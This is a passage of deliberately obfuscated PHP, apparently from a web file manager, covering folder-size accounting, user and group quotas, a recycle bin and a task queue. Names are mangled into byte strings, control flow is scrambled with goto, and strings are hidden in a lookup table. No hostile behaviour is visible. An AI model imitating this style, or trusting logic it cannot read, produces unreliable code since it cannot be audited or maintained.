TaskRun::timeLimitCall($d­ñ›¾Ìó, $d¡¢…êÂÄÉ[1979], $A·à¤îÀˆ÷, 1.5); goto AÊ‡Ë ¦Œ·; AÊ‡Ë ¦Œ·: } public function folderSizeResetChildren($e´…Î¥— ‹) { goto AÙ ëô»¾; AÙ ëô»¾: $eÜ¹ğ”Ì„  =& $_SERVER[¬ı§†‰ú˜¼]; $this->sourceCacheClear($e´…Î¥— ‹); $BğÉäÑŸõ = $this->sourceInfo($e´…Î¥— ‹); goto D† ³×Öé¸; b¹Ùóº: foreach ($bçë¡‡Æ” as $DóÓ²½••) { if ($DóÓ²½••[$eÜ¹ğ”Ì„ [78]] == $DóÓ²½••[$eÜ¹ğ”Ì„ [1981]]) { continue; } $AÌÔé»Òã‚[] = array($eÜ¹ğ”Ì„ [394], $DóÓ²½••[$eÜ¹ğ”Ì„ [394]], $eÜ¹ğ”Ì„ [78], $DóÓ²½••[$eÜ¹ğ”Ì„ [78]]); } $this->saveAll($AÌÔé»Òã‚); goto C‚‡¡“—‚»; d‚Âç•¼…: foreach ($AÙÁ™Ùƒ“ë as $DóÓ²½••) { $Dè™ÈêšÛƒ = $DóÓ²½••[$eÜ¹ğ”Ì„ [476]] . $eÜ¹ğ”Ì„ [33]; if (!isset($bçë¡‡Æ”[$Dè™ÈêšÛƒ])) { continue; } if ($DóÓ²½••[$eÜ¹ğ”Ì„ [421]] == $bçë¡‡Æ”[$Dè™ÈêšÛƒ][$eÜ¹ğ”Ì„ [421]]) { $bçë¡‡Æ”[$Dè™ÈêšÛƒ][$eÜ¹ğ”Ì„ [78]] += $DóÓ²½••[$eÜ¹ğ”Ì„ [78]]; } } foreach ($bçë¡‡Æ” as $DóÓ²½••) { $EäùØá­Ò = $this->parentLevelArray($DóÓ²½••[$eÜ¹ğ”Ì„ [485]]); foreach ($EäùØá­Ò as $Dè™ÈêšÛƒ) { $Dè™ÈêšÛƒ = $Dè™ÈêšÛƒ . $eÜ¹ğ”Ì„ [33]; if (!isset($bçë¡‡Æ”[$Dè™ÈêšÛƒ])) { continue; } if ($DóÓ²½••[$eÜ¹ğ”Ì„ [421]] == $bçë¡‡Æ”[$Dè™ÈêšÛƒ][$eÜ¹ğ”Ì„ [421]]) { $bçë¡‡Æ”[$Dè™ÈêšÛƒ][$eÜ¹ğ”Ì„ [78]] += $DóÓ²½••[$eÜ¹ğ”Ì„ [78]]; } } } $AÌÔé»Òã‚ = array(); goto b¹Ùóº; D† ³×Öé¸: $a‹àƒ•¾óÉ = array($eÜ¹ğ”Ì„ [545] => 1, $eÜ¹ğ”Ì„ [552] => array($eÜ¹ğ”Ì„ [511], $BğÉäÑŸõ[$eÜ¹ğ”Ì„ [485]] . $e´…Î¥— ‹ . $eÜ¹ğ”Ì„ [512])); $F¹ÙªÀÃ†ù = $eÜ¹ğ”Ì„ [1980]; $bçë¡‡Æ” = $this->field($F¹ÙªÀÃ†ù)->where($a‹àƒ•¾óÉ)->select(); goto cÌ²Œªæ‘; cÌ²Œªæ‘: $a‹àƒ•¾óÉ[$eÜ¹ğ”Ì„ [401]] = 0; $AÙÁ™Ùƒ“ë = $this->field($F¹ÙªÀÃ†ù)->where($a‹àƒ•¾óÉ)->select(); if (!$AÙÁ™Ùƒ“ë) { return; } goto A‡× Œ½¿Ğ; A‡× Œ½¿Ğ: $bçë¡‡Æ”[] = $BğÉäÑŸõ; $bçë¡‡Æ” = array_to_keyvalue($bçë¡‡Æ”, $eÜ¹ğ”Ì„ [394]); foreach ($bçë¡‡Æ” as $CøÄ§Ÿ·ĞÓ => $DóÓ²½••) { $bçë¡‡Æ”[$CøÄ§Ÿ·ĞÓ][$eÜ¹ğ”Ì„ [1981]] = $bçë¡‡Æ”[$CøÄ§Ÿ·ĞÓ][$eÜ¹ğ”Ì„ [78]]; $bçë¡‡Æ”[$CøÄ§Ÿ·ĞÓ][$eÜ¹ğ”Ì„ [78]] = 0; } goto d‚Âç•¼…; C‚‡¡“—‚»: } public function userSpaceReset($C¸§ô×à½Á = false) { $bŒ†³†éŠõ =& $_SERVER[¬ı§†‰ú˜¼]; $DõËóò™ÛÍ = $this->where(array($bŒ†³†éŠõ[402] => self::TYPE_USER, $bŒ†³†éŠõ[482] => $C¸§ô×à½Á, $bŒ†³†éŠõ[401] => 0))->sum($bŒ†³†éŠõ[78]); $DõËóò™ÛÍ = !$DõËóò™ÛÍ || $DõËóò™ÛÍ <= 0 ? 0 : $DõËóò™ÛÍ; Model($bŒ†³†éŠõ[501])->userEdit($C¸§ô×à½Á, array($bŒ†³†éŠõ[1676] => $DõËóò™ÛÍ)); } public function targetSpaceUpdate($f¥ÍÂ¨ò·, $f¤—¥¢ŠÖŒ) { $Eõç‡¯Ëæ˜ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$f¤—¥¢ŠÖŒ) { return; } if (!in_array($f¥ÍÂ¨ò·, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $eÃø‘Ò“Ü = $this->targetSpaceSize($f¥ÍÂ¨ò·, $f¤—¥¢ŠÖŒ); if ($f¥ÍÂ¨ò· == self::TYPE_USER) { Model($Eõç‡¯Ëæ˜[501])->userEdit($f¤—¥¢ŠÖŒ, array($Eõç‡¯Ëæ˜[1676] => $eÃø‘Ò“Ü)); } else { if ($f¥ÍÂ¨ò· == self::TYPE_GROUP) { Model($Eõç‡¯Ëæ˜[484])->groupEdit($f¤—¥¢ŠÖŒ, array($Eõç‡¯Ëæ˜[1676] => $eÃø‘Ò“Ü)); } } } public function targetSpaceSize($EòŒñğ‘¬À, $AšçË­ã˜) { goto Bâèğ«Áš; C´ìá’ô‘Ï: $dö·Ö˜†Ú‰ = floatval($aßãšê˜ò[$FêáëŒ Á•[78]]); $e¶Æ¾Èƒá = array($FêáëŒ Á•[552] => array($FêáëŒ Á•[511], $FêáëŒ Á•[497] . $aßãšê˜ò[$FêáëŒ Á•[394]] . $FêáëŒ Á•[512])); $bæ×¶­óáä = Model($FêáëŒ Á•[419])->field($FêáëŒ Á•[408])->where($e¶Æ¾Èƒá)->select(); goto dÁ²¹º®”Â; cËõ¢ÅáĞ: $dö·Ö˜†Ú‰ = !$dö·Ö˜†Ú‰ || $dö·Ö˜†Ú‰ <= 0 ? 0 : $dö·Ö˜†Ú‰; return $dö·Ö˜†Ú‰; goto bğØ÷¹—; dÁ²¹º®”Â: $bæ×¶­óáä = array_to_keyvalue($bæ×¶­óáä, $FêáëŒ Á•[33], $FêáëŒ Á•[394]); $bæ×¶­óáä = array_unique(array_filter($bæ×¶­óáä)); if ($bæ×¶­óáä) { $e¶Æ¾Èƒá = array($FêáëŒ Á•[408] => array($FêáëŒ Á•[409], $bæ×¶­óáä)); $dö·Ö˜†Ú‰ += floatval($this->where($e¶Æ¾Èƒá)->sum($FêáëŒ Á•[78])); } goto cËõ¢ÅáĞ; Bâèğ«Áš: $FêáëŒ Á• =& $_SERVER[¬ı§†‰ú˜¼]; $aßãšê˜ò = $this->sourceRoot($EòŒñğ‘¬À, $AšçË­ã˜, !0); if (!$aßãšê˜ò) { return 0; } goto C´ìá’ô‘Ï; bğØ÷¹—: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($e‹„İ›§Ó) { return $this->fileTypeProfile($e‹„İ›§Ó, SourceModel::TYPE_USER); } public function groupFileTypeProfile($cö÷»í«¡Ô) { return $this->fileTypeProfile($cö÷»í«¡Ô, SourceModel::TYPE_GROUP); } private function fileTypeProfile($dçî˜Ê­, $e”¦Ê±¦¬‘) { goto f¸³Š†Â—; C·‚¥Šß¼ª: $a”ÄÄíÓï™ = array(); $a”ÄÄíÓï™[$Bê’œÛãÂÇ[1983]] = array($Bê’œÛãÂÇ[1984] => LNG($Bê’œÛãÂÇ[1983]), $Bê’œÛãÂÇ[1985] => $this->where($F¯Ì÷ĞÜó)->count(), $Bê’œÛãÂÇ[547] => $this->where($F¯Ì÷ĞÜó)->sum($Bê’œÛãÂÇ[78])); $Eêòâã¾¤µ = KodIO::fileTypeList(); goto AÅ¿ß¸ª–‘; C ‡åù‘Ğ—: if ($EÕÍÉ¡ßå) { return $EÕÍÉ¡ßå; } $F¯Ì÷ĞÜó = array($Bê’œÛãÂÇ[545] => 0); if ($dçî˜Ê­ != !1) { $F¯Ì÷ĞÜó[$Bê’œÛãÂÇ[482]] = $dçî˜Ê­; $F¯Ì÷ĞÜó[$Bê’œÛãÂÇ[402]] = $e”¦Ê±¦¬‘; } goto C·‚¥Šß¼ª; f¸³Š†Â—: $Bê’œÛãÂÇ =& $_SERVER[¬ı§†‰ú˜¼]; $Fèö›™ÙğÑ = $Bê’œÛãÂÇ[1982] . $dçî˜Ê­ . $Bê’œÛãÂÇ[71] . $e”¦Ê±¦¬‘; $EÕÍÉ¡ßå = Cache::get($Fèö›™ÙğÑ); goto C ‡åù‘Ğ—; AÅ¿ß¸ª–‘: foreach ($Eêòâã¾¤µ as $CÂÄ  ‹–ˆ => $Fò¦Ù›âÕœ) { $F¯Ì÷ĞÜó[$Bê’œÛãÂÇ[403]] = $this->fileTypeWhere($CÂÄ  ‹–ˆ); $a”ÄÄíÓï™[$CÂÄ  ‹–ˆ] = array($Bê’œÛãÂÇ[1984] => $Fò¦Ù›âÕœ[$Bê’œÛãÂÇ[28]], $Bê’œÛãÂÇ[1985] => $this->where($F¯Ì÷ĞÜó)->count(), $Bê’œÛãÂÇ[547] => $this->where($F¯Ì÷ĞÜó)->sum($Bê’œÛãÂÇ[78])); } Cache::set($Fèö›™ÙğÑ, $a”ÄÄíÓï™, 1200); return $a”ÄÄíÓï™; goto D±‡¹õÑ°Ç; D±‡¹õÑ°Ç: } public function fileNameExist($bíõ¡¦È‹, $D‹¡³á—äÍ) { $eÎ¨ÃÀœõ =& $_SERVER[¬ı§†‰ú˜¼]; $fïôê÷ŞÈ‹ = $this->where(array($eÎ¨ÃÀœõ[476] => $bíõ¡¦È‹, $eÎ¨ÃÀœõ[28] => $D‹¡³á—äÍ, $eÎ¨ÃÀœõ[421] => 0))->find(); return is_array($fïôê÷ŞÈ‹) ? $fïôê÷ŞÈ‹[$eÎ¨ÃÀœõ[394]] : !1; } public function childList($BˆŠ¼®Àˆ™) { goto Bö‹ì³á•£; Bö‹ì³á•£: $fÚçìŞ‡ˆ =& $_SERVER[¬ı§†‰ú˜¼]; $aÜ‹Ù–™ª = $fÚçìŞ‡ˆ[1960] . $BˆŠ¼®Àˆ™; if (isset(self::$cacheChildList[$aÜ‹Ù–™ª])) { return self::$cacheChildList[$aÜ‹Ù–™ª]; } goto AáÊ¬“ÖŞ“; AÒ“¹ëä‚: self::$cacheChildList[$aÜ‹Ù–™ª] = $e²‰˜ Ö²ë; foreach ($e²‰˜ Ö²ë as $c‡É é÷×Ÿ) { $aÜ‹Ù–™ª = $fÚçìŞ‡ˆ[436] . $c‡É é÷×Ÿ[$fÚçìŞ‡ˆ[394]]; self::$cacheSourceInfo[$aÜ‹Ù–™ª] = $c‡É é÷×Ÿ; } return $e²‰˜ Ö²ë; goto bÛïÕåù“; AáÊ¬“ÖŞ“: $Eƒƒ¹«Ê²¦ = array($fÚçìŞ‡ˆ[476] => intval($BˆŠ¼®Àˆ™), $fÚçìŞ‡ˆ[421] => 0); $e²‰˜ Ö²ë = $this->where($Eƒƒ¹«Ê²¦)->select(); $e²‰˜ Ö²ë = $e²‰˜ Ö²ë ? $e²‰˜ Ö²ë : array(); goto AÒ“¹ëä‚; bÛïÕåù“: } public function fileNameAuto($bÑèçˆàÚÇ, $dŞÔ÷òİˆì, $B³‚ŒŒ°‹¿ = REPEAT_RENAME, $DóÁ…ì—šÑ = false) { $d«Éï’¯õ =& $_SERVER[¬ı§†‰ú˜¼]; $B™£Ø‡˜îÃ = array($d«Éï’¯õ[476] => $bÑèçˆàÚÇ, $d«Éï’¯õ[421] => 0, $d«Éï’¯õ[28] => array($d«Éï’¯õ[379], $dŞÔ÷òİˆì . $d«Éï’¯õ[380])); $BË´‚à¦§ = $this->field($d«Éï’¯õ[28])->where($B™£Ø‡˜îÃ)->select(); $C±˜È’¿Ú = array_to_keyvalue($BË´‚à¦§, $d«Éï’¯õ[33], $d«Éï’¯õ[28]); return $this->fileNameAutoGet($C±˜È’¿Ú, $dŞÔ÷òİˆì, $B³‚ŒŒ°‹¿, $DóÁ…ì—šÑ); } public function fileNameAutoGet($aëÏåÑ£, $d¬šå§Æµ, $E­§Áµˆ‹¢, $dÍÇ ‰æ¨¦) { $fæöÆâö³ =& $_SERVER[¬ı§†‰ú˜¼]; if ($E­§Áµˆ‹¢ == REPEAT_REPLACE || !$aëÏåÑ£ || !in_array_not_case($d¬šå§Æµ, $aëÏåÑ£) || $dÍÇ ‰æ¨¦ && $E­§Áµˆ‹¢ != REPEAT_RENAME_FOLDER) { return $d¬šå§Æµ; } if ($E­§Áµˆ‹¢ == REPEAT_SKIP) { return !1; } $BƒÖ±æ = $fæöÆâö³[95] . get_path_ext($d¬šå§Æµ); $BƒÖ±æ = $BƒÖ±æ == $fæöÆâö³[95] || $dÍÇ ‰æ¨¦ ? $fæöÆâö³[33] : $BƒÖ±æ; for ($e—¦Î¤«™² = 1; $e—¦Î¤«™² <= count($aëÏåÑ£) + 1; $e—¦Î¤«™²++) { $A±µÇË‰Ã  = substr($d¬šå§Æµ, 0, strlen($d¬šå§Æµ) - strlen($BƒÖ±æ)); $dóœÕö¸è… = $A±µÇË‰Ã  . "\x28{$e—¦Î¤«™²}\51{$BƒÖ±æ}"; if (!in_array_not_case($dóœÕö¸è…, $aëÏåÑ£)) { return $dóœÕö¸è…; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\143\x65\x5f\162\145\143\171\x63\154\145"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\x69\155\x65", "\164\x69\x6d\145", "\151\x6e\x73\x65\162\164", "\146\x75\156\143\164\151\x6f\x6e")); public function listData($e¹óÊ¾çñé = false) { $DËÁÆƒİ¹ä =& $_SERVER[¬ı§†‰ú˜¼]; $e¹óÊ¾çñé = $e¹óÊ¾çñé ? $e¹óÊ¾çñé : USER_ID; $EŞ¶·ïÕ = $this->where(array($DËÁÆƒİ¹ä[1519] => $e¹óÊ¾çñé))->select(); return array_to_keyvalue($EŞ¶·ïÕ, $DËÁÆƒİ¹ä[33], $DËÁÆƒİ¹ä[394]); } public function moveToRecycle($cí­ŠÍƒá) { goto b²®ääË„; C‰¶Ù‰ÉÏ: $this->recycleMove($cí­ŠÍƒá, 1); if ($b–•ã´ë[$cÃ›İ··ì¸[401]] == $cÃ›İ··ì¸[87]) { $e¯µÂß±·  = array($cÃ›İ··ì¸[552] => array($cÃ›İ··ì¸[511], $b–•ã´ë[$cÃ›İ··ì¸[485]] . $cí­ŠÍƒá . $cÃ›İ··ì¸[512])); $fÖš™††ˆ¨->where($e¯µÂß±· )->setField($cÃ›İ··ì¸[421], 1); } goto fåŸ±Üíù; bÑà–ï¾çâ: if (!$b–•ã´ë || $b–•ã´ë[$cÃ›İ··ì¸[421]] == $cÃ›İ··ì¸[87]) { return; } $D¡ã‹øĞ = array($cÃ›İ··ì¸[408] => $cí­ŠÍƒá, $cÃ›İ··ì¸[1519] => USER_ID, $cÃ›İ··ì¸[548] => $b–•ã´ë[$cÃ›İ··ì¸[402]], $cÃ›İ··ì¸[549] => $b–•ã´ë[$cÃ›İ··ì¸[482]], $cÃ›İ··ì¸[552] => $b–•ã´ë[$cÃ›İ··ì¸[485]]); $this->add($D¡ã‹øĞ); goto C‰¶Ù‰ÉÏ; b²®ääË„: $cÃ›İ··ì¸ =& $_SERVER[¬ı§†‰ú˜¼]; $fÖš™††ˆ¨ = Model($cÃ›İ··ì¸[1204]); $b–•ã´ë = $fÖš™††ˆ¨->sourceInfo($cí­ŠÍƒá); goto bÑà–ï¾çâ; fåŸ±Üíù: } public function clear() { $this->remove(!1); } public function remove($E§ëÄˆÓä = false, $d¯ö“å†×à = false) { goto F‡¡ÌŒíõë; BìÈ¨îß÷£: $DæŞì–Õª¤ = $this->listData($d¯ö“å†×à); $E§ëÄˆÓä = $E§ëÄˆÓä === !1 ? !1 : $E§ëÄˆÓä; $Aôæ”‹öÌ¸ = array(); goto D¿›®‹Œç; D¿›®‹Œç: foreach ($DæŞì–Õª¤ as $c°ğÎÕÍéë) { if ($E§ëÄˆÓä != !1 && !in_array($c°ğÎÕÍéë, $E§ëÄˆÓä)) { continue; } $EõØÜãŞ­ = $AÀÚõÖŒù³->sourceInfo($c°ğÎÕÍéë); $AÀÚõÖŒù³->remove($c°ğÎÕÍéë, !1); $bÑÑ‰áæ¹ = $EõØÜãŞ­[$b´áíèÔºŞ[402]] . $b´áíèÔºŞ[71] . $EõØÜãŞ­[$b´áíèÔºŞ[482]]; $Aôæ”‹öÌ¸[$bÑÑ‰áæ¹] = array($b´áíèÔºŞ[548] => $EõØÜãŞ­[$b´áíèÔºŞ[402]], $b´áíèÔºŞ[482] => $EõØÜãŞ­[$b´áíèÔºŞ[482]]); $this->where(array($b´áíèÔºŞ[394] => $c°ğÎÕÍéë))->delete(); } foreach ($Aôæ”‹öÌ¸ as $D’ñùí¿¢) { $AÀÚõÖŒù³->targetSpaceUpdate($D’ñùí¿¢[$b´áíèÔºŞ[402]], $D’ñùí¿¢[$b´áíèÔºŞ[482]]); } goto D£óÛÚ‰ø³; F‡¡ÌŒíõë: $b´áíèÔºŞ =& $_SERVER[¬ı§†‰ú˜¼]; $d¯ö“å†×à = $d¯ö“å†×à ? $d¯ö“å†×à : USER_ID; $AÀÚõÖŒù³ = Model($b´áíèÔºŞ[1204]); goto BìÈ¨îß÷£; D£óÛÚ‰ø³: } public function restore($fÎ“ ìÃ½Æ = false) { $döç÷ÕØçŠ = $this->listData(); $this->_restoreSource($döç÷ÕØçŠ, $fÎ“ ìÃ½Æ); } public function removeUserAll($FàÇâªÄÓ‘) { $this->remove(!1, $FàÇâªÄÓ‘); } private function _restoreSource($a¨ÁèÀ‰é, $DŞß…Ë§àÍ) { goto c¦Èƒ‡‹â˜; c¦Èƒ‡‹â˜: $E²„‘àŒİ =& $_SERVER[¬ı§†‰ú˜¼]; $bÜ¬Ì»Û = Model($E²„‘àŒİ[1204]); $DŞß…Ë§àÍ = $DŞß…Ë§àÍ == !1 ? !1 : $DŞß…Ë§àÍ; goto Bñœ¥ÀÔ×; BÎÃ‹î²÷í: $bÜ¬Ì»Û->updateModifyTime($Bã™Ôàó––); goto Aõ¾Ìîƒ¶ô; Bñœ¥ÀÔ×: if (!$a¨ÁèÀ‰é) { return !0; } $Bã™Ôàó–– = array(); foreach ($a¨ÁèÀ‰é as $câÃ›š÷ŒŸ) { goto dĞƒ°ôõÅ; f‘¬…Ò’©ó: if ($dÑ÷Ÿ™ë‚í[$E²„‘àŒİ[421]] == $E²„‘àŒİ[87]) { continue; } $bÜ¬Ì»Û->lockMoveStart($câÃ›š÷ŒŸ); $this->recycleMove($câÃ›š÷ŒŸ, 0); goto EÀ“†Öæ·Ò; e÷µäã¨é›: $Bã™Ôàó––[] = $BÅªë™–‘…[$E²„‘àŒİ[476]]; if ($BÅªë™–‘…[$E²„‘àŒİ[401]] == $E²„‘àŒİ[87]) { $Bã™Ôàó––[] = $câÃ›š÷ŒŸ; } $bÜ¬Ì»Û->lockMoveEnd($câÃ›š÷ŒŸ); goto DÙê´âšÓñ; dĞƒ°ôõÅ: if ($DŞß…Ë§àÍ != !1 && !in_array($câÃ›š÷ŒŸ, $DŞß…Ë§àÍ)) { continue; } $BÅªë™–‘… = $bÜ¬Ì»Û->sourceInfo($câÃ›š÷ŒŸ); $dÑ÷Ÿ™ë‚í = $bÜ¬Ì»Û->sourceInfo($BÅªë™–‘…[$E²„‘àŒİ[476]]); goto f‘¬…Ò’©ó; EÀ“†Öæ·Ò: if ($BÅªë™–‘…[$E²„‘àŒİ[401]] == $E²„‘àŒİ[87]) { $bÚ×œà®Éµ = array($E²„‘àŒİ[552] => array($E²„‘àŒİ[511], $BÅªë™–‘…[$E²„‘àŒİ[485]] . $câÃ›š÷ŒŸ . $E²„‘àŒİ[512])); $bÜ¬Ì»Û->where($bÚ×œà®Éµ)->setField($E²„‘àŒİ[421], 0); $this->restoreFolderChildren($câÃ›š÷ŒŸ, $a¨ÁèÀ‰é); } $this->where(array($E²„‘àŒİ[394] => $câÃ›š÷ŒŸ))->delete(); $bÜ¬Ì»Û->folderSizeReset($BÅªë™–‘…[$E²„‘àŒİ[476]]); goto e÷µäã¨é›; DÙê´âšÓñ: } goto BÎÃ‹î²÷í; Aõ¾Ìîƒ¶ô: } private function restoreFolderChildren($bÆøĞİ¤¯ö, $AÚŞ»¸Áœ) { goto F™­Ìºõ´’; F™­Ìºõ´’: $fÃ×ĞÉ¾ß© =& $_SERVER[¬ı§†‰ú˜¼]; $a³ß¢¸£› = Model($fÃ×ĞÉ¾ß©[1204]); $DÛèË÷ˆ¥» = array($fÃ×ĞÉ¾ß©[394] => array($fÃ×ĞÉ¾ß©[7], array())); goto cÒÃ‰¡Ó÷™; cÒÃ‰¡Ó÷™: foreach ($AÚŞ»¸Áœ as $CÄŞî´ƒÑï) { if ($CÄŞî´ƒÑï == $bÆøĞİ¤¯ö) { continue; } if (!$a³ß¢¸£›->isParentOf($bÆøĞİ¤¯ö, $CÄŞî´ƒÑï)) { continue; } $D×ñÚÇËØ¬ = $a³ß¢¸£›->sourceInfo($CÄŞî´ƒÑï); if ($D×ñÚÇËØ¬[$fÃ×ĞÉ¾ß©[401]] == $fÃ×ĞÉ¾ß©[87]) { $DÛèË÷ˆ¥»[] = array($fÃ×ĞÉ¾ß©[552] => array($fÃ×ĞÉ¾ß©[511], $D×ñÚÇËØ¬[$fÃ×ĞÉ¾ß©[485]] . $CÄŞî´ƒÑï . $fÃ×ĞÉ¾ß©[512])); } else { $DÛèË÷ˆ¥»[$fÃ×ĞÉ¾ß©[394]][1][] = $CÄŞî´ƒÑï; } } if (!$DÛèË÷ˆ¥»[$fÃ×ĞÉ¾ß©[394]][1]) { unset($DÛèË÷ˆ¥»[$fÃ×ĞÉ¾ß©[394]]); } if (!$DÛèË÷ˆ¥») { return; } goto dŸÍ½”„åÙ; dŸÍ½”„åÙ: $DÛèË÷ˆ¥»[$fÃ×ĞÉ¾ß©[394]][1] = array_unique($DÛèË÷ˆ¥»[$fÃ×ĞÉ¾ß©[394]][1]); $DÛèË÷ˆ¥»[$fÃ×ĞÉ¾ß©[956]] = $fÃ×ĞÉ¾ß©[1777]; $a³ß¢¸£›->where($DÛèË÷ˆ¥»)->setField($fÃ×ĞÉ¾ß©[421], 1); goto f‚Û«ö‘¢; f‚Û«ö‘¢: } private function recycleMove($f¦¢éßÖí‡, $E§ÍÙÓâ = 1) { $aĞÆøæ×‰ =& $_SERVER[¬ı§†‰ú˜¼]; $aÅª…„£„ = Model($aĞÆøæ×‰[1204]); $Eµ“Ã¨Ş¤ = Model($aĞÆøæ×‰[1986]); $C™õƒøøÃ = array($aĞÆøæ×‰[394] => $f¦¢éßÖí‡); if ($E§ÍÙÓâ) { $aÅª…„£„->where($C™õƒøøÃ)->setField($aĞÆøæ×‰[421], 1); $Eµ“Ã¨Ş¤->eventRecycle($f¦¢éßÖí‡, $aĞÆøæ×‰[1987]); } else { $FäÜ”ñ¡Ó» = $aÅª…„£„->where($C™õƒøøÃ)->find(); $e¼êòï­êÈ = $FäÜ”ñ¡Ó»[$aĞÆøæ×‰[401]] == $aĞÆøæ×‰[87]; $cİ°áÑÌ‚Ü = $aÅª…„£„->fileNameAuto($FäÜ”ñ¡Ó»[$aĞÆøæ×‰[476]], $FäÜ”ñ¡Ó»[$aĞÆøæ×‰[28]], REPEAT_RENAME_FOLDER, $e¼êòï­êÈ); if ($cİ°áÑÌ‚Ü != $FäÜ”ñ¡Ó»[$aĞÆøæ×‰[28]]) { $aÅª…„£„->rename($f¦¢éßÖí‡, $cİ°áÑÌ‚Ü); } $aÅª…„£„->where($C™õƒøøÃ)->setField($aĞÆøæ×‰[421], 0); $Eµ“Ã¨Ş¤->eventRecycle($f¦¢éßÖí‡, $aĞÆøæ×‰[1988]); } } } goto b…Ç¦“…øŒ; aØ¶¸—¶ŠÛ: function binCheckBigger($bŠõÙµ’®, $a™²å”õ×”) { return $bŠõÙµ’® > $a™²å”õ×”; } $_SERVER[$_SERVER[šé»][3]] = (base64_decode('OTA2Ng==')."\60\70")+0;$_MFiC="7HudstTyAzm8b99A4sDbsMNwzZctQbuTagZZXJQEwkBsxvMvSqTYyKkNPzJqARBGar2t9UX";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($b —æÆŠÂ, $BÚ¥Ó¨µãÃ) { $C•¾ç³„ä =& $_SERVER[¬ı§†‰ú˜¼]; if (isset(self::$_methodList[$b —æÆŠÂ])) { return @call_user_func_array(self::$_methodList[$b —æÆŠÂ], $BÚ¥Ó¨µãÃ); } else { if (method_exists($this, $b —æÆŠÂ)) { return call_user_func_array(array($this, $b —æÆŠÂ), $BÚ¥Ó¨µãÃ); } else { think_exception(__CLASS__ . $C•¾ç³„ä[4] . $b —æÆŠÂ . $C•¾ç³„ä[5]); } } } public static function __callStatic($a‡È¢ïñ©ø, $Aùù­©ã) { if (isset(self::$_methodListStatic[$a‡È¢ïñ©ø])) { return call_user_func_array(self::$_methodListStatic[$a‡È¢ïñ©ø], $Aùù­©ã); } else { if (method_exists(self, $a‡È¢ïñ©ø)) { return call_user_func_array(array(self, $a‡È¢ïñ©ø), $Aùù­©ã); } else { show_json("{$a‡È¢ïñ©ø}\50\51\x20\x6e\157\164\40\x65\x78\151\x73\x74\x3b", !1); } } } public static function addMethod($f‰Õµ”ë‰Œ, $EíİÃ°…ğ¯) { self::$_methodList[$f‰Õµ”ë‰Œ] = $EíİÃ°…ğ¯; } public static function addMethodStatic($fë¼ó•Òçë, $bØäŒßá•À) { self::$_methodListStatic[$fë¼ó•Òçë] = $bØäŒßá•À; } } goto E­å¢££ˆÊ; C‡ãï’Äò: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\x73\x6b\121\x75\x65\165\x65\x4c\145\156\x67\x74\x68"; const QUEUE_DATA = "\164\x61\x73\153\121\x75\145\165\145\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($E‡­ˆ‰áĞœ, $f Û°¥ÍÉ¡ = array(), $C×Š¹‹ò÷ = '', $B¦íó‘Í¹ = '') { $b—ÙÑô»—Õ =& $_SERVER[¬ı§†‰ú˜¼]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($B¦íó‘Í¹ && array_find_by_field(self::$listData, $b—ÙÑô»—Õ[93], $B¦íó‘Í¹)) { return !0; } self::$listData[] = array($b—ÙÑô»—Õ[261] => $E‡­ˆ‰áĞœ, $b—ÙÑô»—Õ[1596] => $f Û°¥ÍÉ¡, $b—ÙÑô»—Õ[429] => $C×Š¹‹ò÷, $b—ÙÑô»—Õ[93] => $B¦íó‘Í¹); return !0; } public static function addSubmit() { $FÓ‰âŞ‡§¿ =& $_SERVER[¬ı§†‰ú˜¼]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($FÓ‰âŞ‡§¿[1597] . json_encode_force(array_to_keyvalue(self::$listData, $FÓ‰âŞ‡§¿[33], $FÓ‰âŞ‡§¿[429])), $FÓ‰âŞ‡§¿[1598]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($bÜÂ‚Øä¤‘, $eÆËÆÍ§Ğ = array(), $BïÅØ²½›„ = '', $CŒò²éè¦ = '') { goto eùâ‰ªÀœ; F‘»¢ŠÙ•: self::setAll($d§ô×Ø¤—™); return !0; goto cËÌïƒŒ‡’; CË‰é²Šò”: if ($CŒò²éè¦ && array_find_by_field($d§ô×Ø¤—™, $CâéÎÊÑÓ“[93], $CŒò²éè¦)) { return !0; } $d§ô×Ø¤—™[] = array($CâéÎÊÑÓ“[261] => $bÜÂ‚Øä¤‘, $CâéÎÊÑÓ“[1596] => $eÆËÆÍ§Ğ, $CâéÎÊÑÓ“[429] => $BïÅØ²½›„, $CâéÎÊÑÓ“[93] => $CŒò²éè¦); write_log($CâéÎÊÑÓ“[1597] . $BïÅØ²½›„, $CâéÎÊÑÓ“[1598]); goto F‘»¢ŠÙ•; eùâ‰ªÀœ: $CâéÎÊÑÓ“ =& $_SERVER[¬ı§†‰ú˜¼]; if (self::count() >= self::MAX_LENGTH) { return !1; } $d§ô×Ø¤—™ = self::getAll(); goto CË‰é²Šò”; cËÌïƒŒ‡’: } public static function run() { goto fÉ¾Ù¿îÓß; fÉ¾Ù¿îÓß: $bóƒ¡»ŸÄá =& $_SERVER[¬ı§†‰ú˜¼]; $cÆ¯ÈŸæÆ¦ = self::getAll(); $b®ÏËÙÙåæ = array_shift($cÆ¯ÈŸæÆ¦); goto f÷Å¹¼Å‚”; EÚ³˜Ú™¢: return !0; goto D—Ğ‹Ò¦ñ; Aë‹ĞÃì: try { Hook::apply($b®ÏËÙÙåæ[$bóƒ¡»ŸÄá[261]], $b®ÏËÙÙåæ[$bóƒ¡»ŸÄá[1596]]); } catch (Exception $cÂ·İèš‚) { } $bùò”˜° à = number_format(timeFloat() - $Cë¨²î™¸å, 3) . $bóƒ¡»ŸÄá[1540]; write_log($bóƒ¡»ŸÄá[1599] . $b®ÏËÙÙåæ[$bóƒ¡»ŸÄá[429]] . $bóƒ¡»ŸÄá[1600] . $bùò”˜° à, $bóƒ¡»ŸÄá[1598]); goto EÚ³˜Ú™¢; f÷Å¹¼Å‚”: if (!$b®ÏËÙÙåæ) { return !1; } self::setAll($cÆ¯ÈŸæÆ¦); $Cë¨²î™¸å = timeFloat(); 